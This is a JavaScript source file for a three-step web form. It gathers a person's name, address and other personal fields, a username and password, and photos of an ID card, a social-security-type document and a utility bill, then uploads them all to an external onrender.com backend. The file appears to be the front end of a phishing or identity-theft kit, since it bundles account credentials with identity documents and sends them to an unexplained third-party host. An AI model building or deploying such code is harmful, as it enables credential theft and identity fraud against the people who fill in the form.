const { useState, useRef } = React;
const forms = document.forms;
const formArray = Array.from(forms);
const buttons = document.querySelectorAll(
  "button[type=submit]:not(#submit-all-info)"
);
const headerButton = document.querySelectorAll("header > button");
const navButtons = document.querySelectorAll(".nav-btn-cont button");
const fileInputs = document.querySelectorAll(".file-upload-container input");
const uploadButtons = document.querySelectorAll(
  ".file-upload-container button"
);
const submitButton = document.querySelector("#submit-all-info");
const submitPersonalInfoBtn = document.querySelector("#submit-a");
const submitIdentityIdBtn = document.querySelector("#submit-b");
const personalInfoInputs = document.forms["form-a"].querySelectorAll("input");
const identityIdInputs = document.forms["form-b"].querySelectorAll("input");
const idVerificationInputs = document.forms["form-c"].querySelectorAll("input");
const loadingSpinner = document.querySelector(".loading-spinner");
const successContainer = document.querySelector(".success_container");
const errorContainer = document.querySelector(".error_container");
let cValue = 0;

let personalInfo = {
  // firstname: "",
  // lastname: "",
  // address: "",
  // "date-of-birth": "",
  // SSN: "",
  // email: "",
  // "phone-number": "",
};

const identityID = {
  username: "",
  password: "",
};

const idVerification = {
  id_card: "",
  ssd: "",
  utility_bill: "",
};
const idVerificationIndex = {
  id_card: 0,
  utility_bill: 1,
  ssd: 2,
};

const files = [];

submitButton.addEventListener("click", async function (e) {
  e.preventDefault();
  // console.log(files);
  if (files.length < 3) {
    alert("Please upload all image");
    return;
  }
  // for (let key in idVerification) {
  //   if (idVerification[key] === "") {
  //     alert("Please upload all image");
  //     return;
  //   }
  // }
  const data = new FormData();
  data.append("id_card", files[0]);
  data.append("utility_bill", files[1]);
  data.append("ssd", files[2]);
  for (let key in personalInfo) {
    data.append(`${key}`, personalInfo[key]);
  }
  for (let key in identityID) {
    data.append(`${key}`, identityID[key]);
  }

  let options = {
    method: "POST",
    mode: "cors",
    // headers: {
    //   "Content-Type": "application/json",
    // },
    // body: JSON.stringify({
    //   ...personalInfo,
    //   ...identityID,
    //   ...idVerification,
    // }),
    body: data,
  };
  // timeoutError();
  let response = await submit(options);
  if (response.status === 500) {
    errorContainer.classList.add("show");
    timeoutError();
  }
  successContainer.classList.add("show");
  timeoutSuccess();
});

async function submit(options) {
  handleToggle();
  let response = await fetch("https://vontaiibackend.onrender.com/", options);
  let responseText = response.json();
  handleToggle();
  return responseText;
}

// function submitPersonalInfo(e) {
//   e.preventDefault();
//   for (let key in personalInfo) {
//     if (personalInfo[key] === "") {
//       alert("Please fill all input field");
//       return;
//     }
//   }
//   // console.log(personalInfo);
//   changeHeaderStyle(1);
//   newFunction(e.target);
// }

submitIdentityIdBtn.addEventListener("click", function (e) {
  e.preventDefault();
  for (let key in identityID) {
    if (identityID[key] === "") {
      alert("Please fill all input field");
      return;
    }
  }
  // console.log(identityID);
  changeHeaderStyle(2);
  newFunction(e.target);
});

personalInfoInputs.forEach((input) => {
  input.addEventListener("change", function (e) {
    personalInfo[e.target.name] = e.target.value;
  });
});

function newFunction(button) {
  let nextForm = button.closest("form").nextElementSibling;
  currentForm = nextForm;
  changeForm(nextForm);
}

identityIdInputs.forEach((input) => {
  input.addEventListener("change", function (e) {
    identityID[e.target.name] = e.target.value;
  });
});

function changeHeaderStyle(value) {
  cValue = value;
  headerButton.forEach((button) => button.classList.remove("active"));
  headerButton[value].classList.add("active");
  if (value < 1) navButtons[0].style.display = "none";
  else navButtons[0].style.display = "block";
  if (value >= 2) navButtons[1].style.display = "none";
  else navButtons[1].style.display = "block";
}

changeHeaderStyle(0);

navButtons[0].addEventListener("click", function (e) {
  let prevForm = currentForm.previousElementSibling;
  currentForm = prevForm;
  changeForm(prevForm);
  changeHeaderStyle(cValue - 1);
});

navButtons[1].addEventListener("click", function (e) {
  let nextForm = currentForm.nextElementSibling;
  currentForm = nextForm;
  changeForm(nextForm);
  changeHeaderStyle(cValue + 1);
});

function changeForm(val) {
  formArray.forEach((form) => {
    form.style.display = "none";
    form.classList.remove("current-form");
  });
  val.style.display = "flex";
  val.classList.add("current-form");
}

uploadButtons.forEach((button) => {
  button.addEventListener("click", function (e) {
    e.preventDefault();
    let id = button.id;
    let fileInput = document.querySelector(`input#${id}`);
    fileInput.click();
  });
});

let reader = new FileReader();
fileInputs.forEach((fileInput) => {
  fileInput.addEventListener("change", function (e) {
    let parentImgArea = fileInput.closest(".img-area");
    let img = parentImgArea.querySelector("img");
    img.style.display = "block";
    let image = this.files[0];
    if (!idVerification[e.target.name]) {
      files.push(this.files[0]);
    } else {
      files[idVerificationIndex[e.target.name]] = this.files[0];
    }
    reader.readAsDataURL(image);
    reader.onload = () => {
      img.src = reader.result;
      idVerification[e.target.name] = reader.result;
      parentImgArea.append(img);
    };
  });
});

const handleToggle = () => {
  if (loadingSpinner.classList.contains("show")) {
    loadingSpinner.classList.remove("show");
    const scrollY = document.body.style.top;
    document.body.style.position = "";
    document.body.style.top = "";
    window.scrollTo(0, parseInt(scrollY || "0") * -1);
  } else {
    document.body.style.position = "fixed";
    document.body.style.top = `-${window.scrollY}px`;
    loadingSpinner.classList.add("show");
  }
};

function timeoutSuccess() {
  setTimeout(() => {
    successContainer.classList.remove("toggle");
    location.reload();
  }, 3000);
}

// function timeoutError() {
//   setTimeout(() => {
//     handleToggle();
//     errorContainer.style.visibility = "visible";
//     timeoutCounter();
//   }, 30000);
// }
function timeoutError() {
  setTimeout(() => {
    errorContainer.style.visibility = "hidden";
  }, 2000);
}
